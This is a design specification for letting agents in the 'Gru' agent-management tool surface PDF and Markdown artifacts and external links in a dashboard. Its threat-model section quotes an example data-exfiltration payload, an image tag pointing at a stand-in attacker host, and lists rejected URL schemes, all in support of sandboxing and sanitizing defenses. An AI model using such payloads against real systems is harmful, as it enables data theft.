# Agent-Surfaced Artifacts — Design Specification

**Date:** 2026-04-24 (revised 2026-04-25 after design review)
**Status:** Draft
**Scope:** Lets a Gru-managed agent (minion) surface a piece of work — a rendered PDF or a Markdown report — and attach session-level external links (GitHub PR, Slack thread, Figma) to a session. Extends the per-session main pane (currently just the Terminal tab) with artifact tabs and a compact link row.

---

## Goal

Today, when a minion produces something the operator should look at — a resume, a design-review writeup, a rendered spec, a freshly-opened GitHub PR — the only surface is the terminal scrollback. The operator has to scroll, copy URLs, and run their own viewer. Every minion ends up reinventing this with a different Markdown blob pasted into chat.

Markdown deserves first-class treatment because it's how agents already write: nearly every spec, design doc, code review, and progress report a minion produces is `.md`. The MVP renders Markdown inline so those land somewhere readable instead of getting lost in scrollback.

Give agents one well-defined way to say "here's an artifact" and one well-defined way to say "here's where this session lives in your other tools."

---

## Two shapes, two APIs

The first revision of this design folded byte artifacts (PDFs, etc.) and external links into one polymorphic table. They share almost no infrastructure — links have no bytes, no MIME, no sandbox, no `/artifacts/<id>` GET — so unifying them paid for symmetry with conditional-on-kind columns and branchy reader code. The revised design splits them:

- **Artifacts** (§1) — bytes a minion produces, served back through the Gru server, rendered inline in a tab.
- **Session links** (§2) — URL pointers that the minion attaches to the session, rendered as a compact chip row above the active tab.

These have separate tables, separate RPCs, separate UI. Cross-references between them are not needed.

---

## 1. Artifacts (bytes)

### Model

An artifact is bytes addressed by an opaque, unguessable URL token. Metadata is just title + MIME type + size. The MVP server accepts `application/pdf` and `text/markdown`; the upload path is shaped so that adding another MIME type later is purely an allowlist change. There is no `kind` field — the wire protocol describes the data, not the rendering decision.

| Limit                                | Default            | Configurable in `~/.gru/server.yaml` |
|--------------------------------------|--------------------|--------------------------------------|
| Per-artifact bytes (PDF)             | 25 MB              | yes                                  |
| Per-artifact bytes (Markdown)        | 5 MB               | yes                                  |
| Per-session count                    | 50                 | yes                                  |
| Per-session total bytes              | 100 MB             | yes                                  |
| Allowed MIME (MVP)                   | `application/pdf`, `text/markdown` | yes (allowlist)  |

Caps exist to keep SQLite small and to stop a runaway agent from filling the disk.

### Wire protocol — minion → server

```
POST /artifacts
X-Gru-Session-ID: <uuid>             ; required
X-Gru-Runtime: <runtime>             ; required, currently "claude-code"
Authorization: Bearer <api-key>      ; same key the gRPC service uses
Content-Type: multipart/form-data
```

Multipart fields:

| Field      | Required | Notes                                                              |
|------------|----------|--------------------------------------------------------------------|
| `title`    | yes      | ≤ 80 chars, displayed as the tab label                             |
| `content`  | yes      | the file bytes; the part's `Content-Type` is the canonical MIME    |

The server validates per MIME:

| MIME              | Validation                                                                 |
|-------------------|----------------------------------------------------------------------------|
| `application/pdf` | Magic-byte sniff: bytes start with `%PDF-`. Per-MIME size cap (25 MB).     |
| `text/markdown`   | UTF-8 decodes cleanly; no NUL bytes; per-MIME size cap (5 MB). The bytes are stored as-is — no server-side rendering and no dual on-disk format. |

Plus the universal checks: declared MIME is on the allowlist, total bytes within per-session caps, session not in a terminal state (§5). On success, returns the full `Artifact` proto serialized as JSON, including the capability URL.

A new event type `artifact.created` is published on success carrying the same `Artifact` proto so UI subscribers don't have to refetch.

### Capability URL

`<iframe src="…">` does not send `Authorization` — browsers don't attach custom headers to navigations. So the artifact endpoint cannot rely on the bearer token that protects `POST /artifacts` and the gRPC API.

Instead, each artifact has an unguessable token (32 bytes from `crypto/rand`, base64url-encoded) generated at upload. The full URL `/artifacts/<token>` is the capability — anyone who holds the URL can fetch the bytes, anyone who doesn't cannot. The token is what gets baked into the iframe `src`. Tokens are stored in the DB and never reissued for a given artifact ID, so cached URLs stay valid until the artifact (or its session) is deleted.

This keeps the GET endpoint simple (no header parsing, no per-request key derivation) and forward-compatible: if Gru ever serves over the public internet, add an expiry timestamp + HMAC and the design is the same shape. Cross-agent isolation (one minion holding another minion's token) is a non-goal; see §4.

### Storage

- **Bytes on disk**: `~/.gru/artifacts/<session_id>/<artifact_id>.bin`, mode `0600`. Filesystem-not-DB keeps SQLite lean and lets the HTTP layer stream large files.
- **Metadata in SQLite**: a new `artifacts` table, added in place to `001_init.sql` (no migration; the project nukes the DB on schema change).

```sql
CREATE TABLE IF NOT EXISTS artifacts (
    id          TEXT PRIMARY KEY,
    session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    title       TEXT NOT NULL,
    mime_type   TEXT NOT NULL,
    size_bytes  INTEGER NOT NULL,
    token       TEXT NOT NULL UNIQUE,
    created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ', 'now'))
);

CREATE INDEX IF NOT EXISTS idx_artifacts_session_id ON artifacts(session_id);
CREATE UNIQUE INDEX IF NOT EXISTS idx_artifacts_token ON artifacts(token);
```

`project_id` is omitted intentionally — it's recoverable through `sessions.project_id`, no query needs it directly, and `ON DELETE CASCADE` on `session_id` already handles project deletion.

### Proto + RPCs

```protobuf
message Artifact {
  string id          = 1;
  string session_id  = 2;
  string title       = 3;
  string mime_type   = 4;
  int64  size_bytes  = 5;
  string url         = 6;   // full server-relative path including the capability token
  google.protobuf.Timestamp created_at = 7;
}

rpc ListArtifacts(ListArtifactsRequest)   returns (ListArtifactsResponse);
rpc DeleteArtifact(DeleteArtifactRequest) returns (DeleteArtifactResponse);

message ListArtifactsRequest  { string session_id = 1; }
message ListArtifactsResponse {
  repeated Artifact artifacts  = 1;
  int32             count      = 2;   // current count, for cap pre-checks
  int64             bytes_used = 3;   // current total bytes, for cap pre-checks
}
message DeleteArtifactRequest  { string id = 1; }
message DeleteArtifactResponse { bool   success = 1; }
```

Creation is HTTP multipart (mirrors `/events`), listing and deletion are gRPC (mirror the rest of the dashboard API). The agent-side helper hides the asymmetry behind one CLI subcommand.

### Minion-side helper

```
gru artifact add --title "Resume" --file out.pdf
```

Reads the session ID from `<cwd>/.gru/session-id` (same lookup `hooks/claude-code.sh` uses) and the server addr/key from `~/.gru/server.yaml`. No new hook event type, no new env var contract.

The 409-on-cap response includes the same `count` and `bytes_used` fields as `ListArtifactsResponse`, so the agent has actionable info: it can list its existing artifacts, pick one to delete, and retry. Auto-eviction is deliberately not in the server's job description — silent eviction would surprise the agent that thought it had surfaced something.

---

## 2. Session links (URLs)

### Model

A session link is just `(session_id, title, url)`. No bytes, no token, no rendering, no sandbox.

```sql
CREATE TABLE IF NOT EXISTS session_links (
    id          TEXT PRIMARY KEY,
    session_id  TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    title       TEXT NOT NULL,
    url         TEXT NOT NULL,
    created_at  TEXT NOT NULL DEFAULT (strftime('%Y-%m-%dT%H:%M:%SZ', 'now'))
);

CREATE INDEX IF NOT EXISTS idx_session_links_session_id ON session_links(session_id);
```

### Proto + RPCs

```protobuf
message SessionLink {
  string id         = 1;
  string session_id = 2;
  string title      = 3;
  string url        = 4;
  google.protobuf.Timestamp created_at = 5;
}

rpc AddSessionLink(AddSessionLinkRequest)       returns (SessionLink);
rpc ListSessionLinks(ListSessionLinksRequest)   returns (ListSessionLinksResponse);
rpc DeleteSessionLink(DeleteSessionLinkRequest) returns (DeleteSessionLinkResponse);

message AddSessionLinkRequest    { string session_id = 1; string title = 2; string url = 3; }
message ListSessionLinksRequest  { string session_id = 1; }
message ListSessionLinksResponse { repeated SessionLink links = 1; }
message DeleteSessionLinkRequest  { string id = 1; }
message DeleteSessionLinkResponse { bool   success = 1; }
```

Server-side validation on add: scheme allowlist `https`, `http`, `mailto`; reject `javascript:`, `data:`, `file:`, RFC1918 / link-local hostnames; URL parses cleanly via `net/url`. Cap: 20 links per session.

A new event type `session_link.created` is published on success carrying the `SessionLink` proto.

### Minion-side helper

```
gru link add --title "GitHub PR #428" --url https://github.com/foo/bar/pull/428
```

Same session-id and server-config lookup as the artifact helper. Icons are derived client-side from the URL hostname (`github.com` → GitHub glyph, `slack.com` → Slack glyph, etc.) — the agent doesn't pick an icon and the server doesn't store one.

---

## 3. UI Integration

### Tab bar above the main pane

`TerminalPanel` currently fills the `<main>` element by itself. Replace its title bar with a per-session tab bar:

```
┌─────────────────────────────────────────────────────────────────┐
│ [Terminal] [Resume.pdf] [Design review]                    [⤢] │  ← tab bar
├─────────────────────────────────────────────────────────────────┤
│ 🔗 GitHub PR #428   💬 Slack thread   🎨 Figma                  │  ← link row (only when present)
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│                  Active tab content                             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

- **Terminal** is always tab 0 and always present. Default selection on session open.
- **Artifact tabs** sorted by `created_at` ascending — tab position stays stable when a new one arrives. We never auto-switch off Terminal; the operator's keystrokes always go where they're looking.
- **Link row** rendered below the tab bar only when ≥ 1 link exists. Each link is a chip (icon + title), `target="_blank" rel="noopener noreferrer nofollow"`. Clicking pops a new browser tab; right-click → "copy link" via native browser behavior.
- A `…` overflow menu on each artifact tab offers **Open in new tab** (loads the artifact URL directly) and **Delete** (calls `DeleteArtifact` after a confirm).

Tabs are rendered by a new `SessionTabs.tsx`. Artifacts and links come from `ListArtifacts(session_id)` + `ListSessionLinks(session_id)` on session open, with live updates from `artifact.created` and `session_link.created` events on the existing `SubscribeEvents` stream.

### Per-tab content rendering

The renderer is MIME-driven, not kind-driven. Adding another MIME type (image, sanitized HTML, etc.) is a server allowlist change plus a renderer branch, not a wire-protocol change. Anything outside the MVP allowlist falls back to a download CTA — server sends `Content-Disposition: attachment` and the UI shows a card with title, size, and a download button.

**`application/pdf`** — embed directly:

```html
<iframe sandbox="" src="/artifacts/<token>" referrerpolicy="no-referrer" />
```

The browser's native PDF viewer handles rendering. Empty `sandbox=""` neutralizes any JS embedded in the PDF.

**`text/markdown`** — render client-side, isolate via iframe:

The dashboard fetches `/artifacts/<token>` to get the bytes, parses the Markdown with `markdown-it` configured `html: false` (so raw `<script>` etc. in the Markdown source is escaped, not passed through), runs the result through `DOMPurify.sanitize()` as defense in depth, and injects the sanitized HTML into a sandboxed iframe via `srcdoc`:

```jsx
const dirty = markdownIt({ html: false, linkify: true }).render(mdBytes);
const clean = DOMPurify.sanitize(dirty);
const doc = `<!doctype html><base target="_blank"><style>${MD_STYLE}</style>${clean}`;
return <iframe sandbox="" srcDoc={doc} referrerPolicy="no-referrer" />;
```

Three independent layers, each blocking the script-execution threat:

1. `markdown-it` with `html: false` doesn't emit raw HTML from the source.
2. `DOMPurify` strips anything that might still be unsafe (`<script>`, `on*=`, `javascript:` URLs, etc.).
3. The iframe has `sandbox=""` (no flags) — even if both above are bypassed, scripts can't execute, no top-level navigation, no form submission, no popups, no parent-DOM access.

`<base target="_blank">` makes any links the operator clicks open in a new browser tab instead of trapping the iframe. Both `markdown-it` and `DOMPurify` are vendored as dashboard dependencies; no external CDN fetch.

**Anything else** — download card. No preview is rendered; the operator clicks to download.

Mobile / narrow viewport: tabs scroll horizontally; the link row wraps. The existing `coarse-pointer` tap handling in `TerminalPanel` for link activation remains unchanged.

---

## 4. Security

### Threat model

Artifacts come from a minion. A minion is an LLM-driven process that prompt injection, malicious file content, or compromised tools can influence. Treat artifact bytes as fully untrusted input.

The threats:

1. **Script execution in untrusted bytes** — embedded JS in HTML/SVG/PDF, `on*=` handlers, `javascript:` URLs.
2. **Cookie or token theft** — same-origin reads, exfiltration of the operator's bearer.
3. **Phishing / clickjacking** — overlaid HTML mimicking the Gru UI to capture credentials or trick approval.
4. **Outbound exfiltration via embedded resources** — `<img src="https://attacker/?…">`.
5. **External links pointing somewhere malicious** — `javascript:`, `data:text/html`, `file://`, internal-network URLs.
6. **CSRF from another origin** — a malicious page the operator visits issuing requests against `localhost:7777`.
7. **Cross-agent reads** — one minion fetching another minion's artifacts.

### Defense

**Server-side validation at upload.** MIME allowlist + per-MIME validation:

- `application/pdf` — magic-byte sniff (bytes must start with `%PDF-`).
- `text/markdown` — UTF-8 decodes cleanly; no NUL bytes. Stored as-is; not parsed or rendered server-side.

Title length-capped. URL scheme allowlist for links, with RFC1918 / link-local hostname rejection. When the MIME allowlist grows beyond PDF + MD (e.g., HTML), each new type carries its own validation rule (HTML would route through `bluemonday.UGCPolicy()` with `<script>`, `<iframe>`, `<object>`, `<embed>`, `<link>`, `<meta>`, `on*` attrs all denied).

**Browser-side sandbox.** Every artifact is rendered inside `<iframe sandbox="" referrerpolicy="no-referrer">`. Empty `sandbox=""` (no flags) gives the iframe an opaque origin: no cookies, no localStorage, no parent-DOM access, no script execution, no top-level navigation, no form submission, no popups. Even if upload-time validation or client-side rendering is bypassed and `<script>` reaches the iframe, it cannot run.

**Markdown-specific layered defense.** Markdown is the one MVP type whose rendered form *is* HTML, so it gets two extra independent layers in front of the iframe sandbox: (1) the parser is `markdown-it` with `html: false`, so raw `<script>` and `<iframe>` in the Markdown source are escaped to entities, not passed through; (2) the parser output is run through `DOMPurify.sanitize()` before being injected as iframe `srcdoc`. PDF doesn't need this: the iframe sandbox alone neutralizes any JS embedded in a PDF.

**Hardening headers on `/artifacts/<token>`.** `Content-Type` set explicitly per artifact (no sniff), `X-Content-Type-Options: nosniff`, `Cross-Origin-Resource-Policy: same-site`, `Content-Disposition` either `inline` for previewable MIMEs or `attachment` otherwise. CSP `sandbox` is intentionally not listed as a separate "layer" — it overlaps the iframe sandbox and behavior across browsers (especially with the native PDF viewer) is uneven enough that it's not load-bearing here.

### Cross-origin posture

The dashboard runs on `localhost:3000`, the API on `:7777`. The bearer (`VITE_GRU_API_KEY`) is compiled into the dashboard's JS bundle. Concretely:

- **CORS allowlist for `:7777`** is `localhost:3000` (and the operator's tailnet host) only. A page at `evil.example` cannot read responses from the API even if it tries to fetch them — the bearer is in another origin's bundle and not exposed via cookie, so cross-origin requests from a malicious page authenticate as nobody.
- **Capability URLs for artifact GETs** mean iframe loads do not depend on CORS or cookies. The token in the URL is the only credential.
- **DNS rebinding against `localhost`** is a concern for the entire API surface, not specific to artifacts. Out of scope here; address it once at the server level (Host-header allowlist) when it bites.

### Cross-agent isolation — explicit non-goal

Every minion holds the same bearer and can `ListArtifacts` / `ListSessionLinks` for any session. Today this is fine: Gru is single-operator and minions are presumed to trust each other. If multi-tenant or cross-agent mistrust ever becomes a real requirement, scope the bearer per session at launch. Calling this out so an implementer doesn't accidentally lean on it.

### Out of scope

- Signed/expiring URLs. Capability URLs with no expiry are correct for the local-only deployment. Add HMAC + expiry the day Gru goes public.
- Antivirus / sandboxed file scanning. The threat is malicious *content*, not malicious *infrastructure*.
- Per-operator artifact ACLs.

---

## 5. Lifecycle

### Creation

- One row in `artifacts`, one file on disk.
- Session-state precondition: `POST /artifacts` returns `410 Gone` if the session is in a terminal state (`completed`, `errored`, `killed`). `404` if the session doesn't exist. Avoids races where an agent uploads to a session the operator just killed.
- Atomic create order: insert DB row first (with token), then write `<artifact_id>.bin.tmp`, fsync, rename to `<artifact_id>.bin`. If the file write fails, delete the row before returning the error so we don't leave a metadata-only artifact. If the row insert fails, no file was ever created.
- Per-session caps enforced inside the same transaction as the insert: count + sum(size_bytes) checked before insert; over-cap returns `409 Conflict` with current count and bytes_used so the agent helper can react.

### Updates

Artifacts are immutable. An agent that wants to "update" uploads a new artifact and (optionally) deletes the old one. Tokens never get reissued; cached URLs stay valid for the artifact's lifetime.

### Garbage collection

| Trigger                              | Effect                                                        |
|--------------------------------------|---------------------------------------------------------------|
| `DeleteArtifact(id)`                 | Delete row → unlink file. File-unlink errors logged + queued for the orphan sweep, not surfaced to the caller. |
| `DeleteSession(session_id)`          | `ON DELETE CASCADE` removes rows; server then `rm -rf` the session's artifact directory. |
| `PruneSessions()`                    | Same as above for every terminal session it touches.         |
| Server boot                          | Scan `~/.gru/artifacts/` for directories without a matching session row, and for files without a matching artifact row → log + remove. |
| Per-session cap exceeded on upload   | Reject with `409`. No auto-eviction.                         |

The `rm -rf`-can-fail-and-doesn't-block-row-delete behavior is what makes the boot-time orphan sweep necessary; it's not redundant.

### PWA / cached URLs

The dashboard is plain Vite + React 19 today, no service worker. If a service worker is added later, artifact `id`s and `token`s are never reused, so there is no cache-poisoning risk from a UUID collision — the worst case is a stale cached 404 after deletion, which is fine.

### Caps (defaults)

```yaml
# ~/.gru/server.yaml
artifacts:
  per_session_max_bytes:  100_000_000
  per_session_max_count:  50
  mime_limits:
    application/pdf:  25_000_000
    text/markdown:     5_000_000
session_links:
  per_session_max_count:  20
```

---

## 6. Minimum Viable Scope

Goal: an agent says "here's a PDF," "here's a Markdown report," or "here's a link" and the operator sees it.

**In MVP:**
1. Two new tables (`artifacts`, `session_links`); `001_init.sql` patched in place.
2. Proto: `Artifact` and `SessionLink` messages; `ListArtifacts`, `DeleteArtifact`, `AddSessionLink`, `ListSessionLinks`, `DeleteSessionLink` RPCs. Two new event types: `artifact.created`, `session_link.created`.
3. `POST /artifacts` HTTP handler — multipart only, MIME allowlist of `application/pdf` and `text/markdown`, per-MIME validation, capability-token URL minted at upload, atomic create.
4. `GET /artifacts/<token>` streamer with the §4 hardening headers.
5. CLI: `gru artifact add` and `gru link add`.
6. Web UI: replace `TerminalPanel`'s title bar with `SessionTabs.tsx`; PDF tabs render as `<iframe sandbox="" src="…">`; Markdown tabs render via `markdown-it` + `DOMPurify` in the parent, then injected as `<iframe sandbox="" srcdoc="…">`; link row shown when ≥ 1 link exists. `markdown-it` and `DOMPurify` vendored as dashboard deps.
7. Lifecycle: cascade-delete on session delete; per-session caps enforced; orphan-directory + orphan-file sweep on boot; `410` on uploads to terminal sessions.

**Deferred:**
1. Additional MIME types — HTML (needs `bluemonday` server-side sanitization), images, generic file downloads. Each is a server-allowlist + renderer change against the same wire shape.
2. A `surfacing-artifacts` skill for agents to know when to use the helper. Worth doing once we know how the primitive feels.
3. Auto-attaching links from session activity (e.g., a hook that detects `gh pr create` and posts a `session_link`).

The MVP exercises the full path — agent → CLI → server → DB + disk → publish event → UI tab → iframe render — and is small enough to land in a single PR.

---

## What's NOT in this spec

- Push notifications when an artifact is created (handled by the existing attention-queue work).
- Authoring tools for the minion to *generate* PDFs or HTML — minions already have `pandoc`, `weasyprint`, etc.
- Cross-session artifact sharing or pinning at the project level.
- Versioning or supersedes-relationships between artifacts.
- Per-operator visibility / ACLs on artifacts.

---

## Revision history

- **2026-04-24** — Initial draft.
- **2026-04-25** — Revised after design review. Split byte artifacts and external links into separate tables and RPCs (was one polymorphic `artifacts` table with conditional columns). Removed the `kind` enum entirely — server validates by MIME, UI renders by MIME, MVP allowlist is just `application/pdf`. Removed the `icon` field and the server-side Markdown rendering path (both speculation). Removed `project_id` from the artifacts schema (recoverable via `sessions.project_id`, unused). Replaced the bearer-token auth story for artifact GETs with a capability-URL token, since iframe `src` does not carry `Authorization`. Added explicit cross-origin / CSRF / cross-agent sections to the threat model. Added `count` + `bytes_used` to `ListArtifactsResponse` and the 409 response so agents can act on cap exceedance. Added a 410-on-terminal-session precondition to fix the upload-vs-kill race. Cut UI fluff (3-second tab pulse, empty-state details, the `replaces` future-extension hint).
- **2026-04-25 (later)** — Added `text/markdown` to the MVP MIME allowlist. Agents already produce most of their output as Markdown (specs, design docs, code reviews, progress reports), so MD has clear day-one value. Architecture is deliberately different from the v1 server-rendered approach the previous review cut: bytes are stored as-is, rendering happens client-side in the dashboard via `markdown-it` (with `html: false`) + `DOMPurify`, and the sanitized HTML is injected into a sandboxed iframe via `srcdoc`. Three independent layers in front of the iframe sandbox, no server-side rendering, no dual on-disk format. Updated caps to a per-MIME map (PDF 25 MB, MD 5 MB).
